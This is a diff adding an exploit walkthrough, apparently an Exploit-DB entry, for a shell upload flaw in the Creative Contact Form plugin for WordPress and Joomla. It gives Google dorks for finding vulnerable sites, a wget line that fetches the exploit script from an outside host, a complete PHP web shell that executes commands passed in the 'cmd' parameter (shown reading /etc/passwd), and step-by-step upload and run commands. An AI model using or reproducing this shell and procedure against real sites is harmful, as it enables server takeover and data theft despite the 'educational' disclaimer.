@@ -1,0 +1,76 @@
+# Exploit Name: Wordpress and Joomla Creative Contact Form Shell Upload Vulnerability
+#               Wordpress plugin version: <= 0.9.7
+#               Joomla extension version: <= 2.0.0
+# 
+# Vulnerability discovered by Gianni Angelozzi
+#
+#
+# Dork google wordpress:  inurl:sexy-contact-form
+# Dork google joomla   :  inurl:com_creativecontactform
+#
+# Tested on BackBox 3.x
+#
+# Exploit written by:
+#
+#                    Claudio Viviani
+#
+#                    http://www.homelab.it
+#                    info@homelab.it
+#
+#                    https://www.facebook.com/homelabit
+#                    https://twitter.com/homelabit
+#                    https://plus.google.com/+HomelabIt1/
+#                    https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+
+####################################################################
+#
+# This video is intended for educational 
+# purposes only and the author can not be held liable for 
+# any kind of damages done whatsoever to your machine, 
+# or damages caused by some other,creative application of this video.
+# In any case you disagree with the above statement,stop here.
+#
+#####################################################################
+
+Wordpress: http://10.0.0.67/wordpress
+
+Joomla: http://10.0.0.67/joomla
+
+Php_shell: shell.php
+
+1) Download Exploit
+
+wget http://www.homelab.it/wp-content/uploads/2014/10/wp_j00m_creative_contact_form_shell_upload.py_.txt
+
+2) Create simple php shell.php:
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+3) Check Backdoor location
+
+Wordpress: http://10.0.0.67/wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/files/shell.php
+
+Joomla: http://10.0.0.67/joomla/components/com_creativecontactform/fileupload/files/shell.php
+
+4) Run Exploit
+
+Wordpress: python wp_j00m_creative_contact_form_shell_upload.py -t http://10.0.0.67/wordpress -c wordpress -f shell.php
+
+Joomla: python wp_j00m_creative_contact_form_shell_upload.py -t http://10.0.0.67/joomla -c joomla -f shell.php
+
+5) Check Backdoor location
+
+See point 3
